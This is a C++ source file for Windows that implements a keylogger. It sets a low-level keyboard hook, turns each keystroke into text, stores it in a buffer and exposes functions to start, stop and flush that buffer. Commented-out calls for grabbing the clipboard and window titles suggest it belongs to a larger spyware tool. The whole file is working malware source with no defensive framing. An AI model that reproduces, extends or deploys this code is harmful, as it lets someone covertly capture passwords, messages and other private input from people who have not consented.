#include <Windows.h>
#include <stdio.h>
#include <mutex>

std::mutex m;

char* KeylogBuffer = 0;
int i = 0;
bool isLogging = false;
HHOOK hKeyHook;

#define KEYLOG_BUFFER_SIZE (1024 * 1024 * 1)

bool IsKeylogging() {
	return isLogging;
}

char* FlushKeylogBuffer(int* length) {
	*length = 0;
	if (i == 0 || KeylogBuffer == 0) return NULL;
	std::lock_guard<std::mutex> guard(m);
	char* newBuffer = (char*)malloc(i + 1);
	newBuffer[i] = 0;
	memcpy_s(newBuffer, i, KeylogBuffer, i);
	*length = i;
	i = 0;
	if (!isLogging) {
		free(KeylogBuffer);
		KeylogBuffer = 0;
	}

	return newBuffer;
}

void FreeFlushKeylogBufferResult(char* data) {
	if (data) free(data);
}

void WriteLog(char* key, int length) {
	std::lock_guard<std::mutex> guard(m);
	if (i + length > KEYLOG_BUFFER_SIZE) return;

	if (length > 0) {
		memcpy_s(KeylogBuffer + i, KEYLOG_BUFFER_SIZE - i, key, length);
	}

	i += length;
}

char easytolower(char in) {
	if (in <= 'Z' && in >= 'A')
		return in - ('Z' - 'z');
	return in;
}

bool shiftModifier = false;

__declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	char szKey[256]; DWORD dwMsg; int i;

	if ((nCode == HC_ACTION) &&
		((wParam == WM_SYSKEYDOWN) ||
			(wParam == WM_KEYDOWN)))
	{
		KBDLLHOOKSTRUCT kbHook;
		kbHook = *((KBDLLHOOKSTRUCT *)lParam);

		dwMsg = 1;
		dwMsg += kbHook.scanCode << 16;
		dwMsg += kbHook.flags << 24;

		i = GetKeyNameTextA(dwMsg, szKey, sizeof(szKey));
#ifdef _DEBUG_
		printf("%s - VK: %d , SC: %d (length: %d)\n", szKey, kbHook.vkCode, kbHook.scanCode, i);
#endif 
		//getClipBoard(); //we don't need this shit for now do we?no
		//getWindowTitle();

		shiftModifier = strcmp(szKey, "Shift") == 0;
		bool usePrefix = false;
		if (shiftModifier)
			usePrefix = true;

		usePrefix = usePrefix || (strcmp(szKey, "Shift") == 0 || GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT));


		if (i == 1)
			if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0 && (!GetAsyncKeyState(VK_LSHIFT) && !GetAsyncKeyState(VK_RSHIFT)))
				szKey[0] = easytolower(szKey[0]);

		if (strcmp(szKey, "Space") == 0)
			if (!GetAsyncKeyState(VK_LMENU) && !GetAsyncKeyState(VK_LCONTROL) && !GetAsyncKeyState(VK_RMENU) && !GetAsyncKeyState(VK_RCONTROL))
			{
				i = 1;
				strcpy_s(szKey, 256, " ");
			}

		if (i > 1 && strcmp(szKey, "Enter") == 0) {
			strcpy_s(szKey, 256, "[Enter]\n");
			i += 3;
		}

		if (i > 1 && strcmp(szKey, "Backspace") != 0) {
			strcpy_s(szKey + strlen(szKey), 256 - strlen(szKey), "\n");
			i += 1;
		}
		else if (i > 1 && strcmp(szKey, "Backspace") == 0) {
			i = -1;
		}

		char* newBuffer = szKey;

		if (usePrefix && i > 1)
		{
			newBuffer = (char*)malloc(500);
			sprintf_s(newBuffer, 500, "%s+%s", "Shift", szKey);
		}
		else if (i == 1) {
			shiftModifier = false;
		}
		if (!shiftModifier) WriteLog(newBuffer, i);

		if (newBuffer != szKey)
			free(newBuffer);
	}

	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void MsgLoop()
{
	MSG message;
	while (isLogging) {
		bool hasMessage = GetMessage(&message, NULL, 0, 0);
		if (hasMessage) {
			TranslateMessage(&message);
			DispatchMessage(&message);
		}
	}
}

DWORD WINAPI StartLoggerInvoker(LPVOID lpParameter) {
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, (HINSTANCE)lpParameter, NULL);
	MsgLoop();
	return 0;
}

bool StartLogger() {
	if (KeylogBuffer == 0) KeylogBuffer = (char*)malloc(KEYLOG_BUFFER_SIZE);
	if (isLogging) return true;
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (!hExe) return 1;

	CreateThread(NULL, NULL, StartLoggerInvoker, (LPVOID)hExe, NULL, NULL);

	isLogging = true;
	return isLogging;
}

bool StopLogger() {
	if (!isLogging) return true;

	isLogging = !UnhookWindowsHookEx(hKeyHook);

	return !isLogging;
}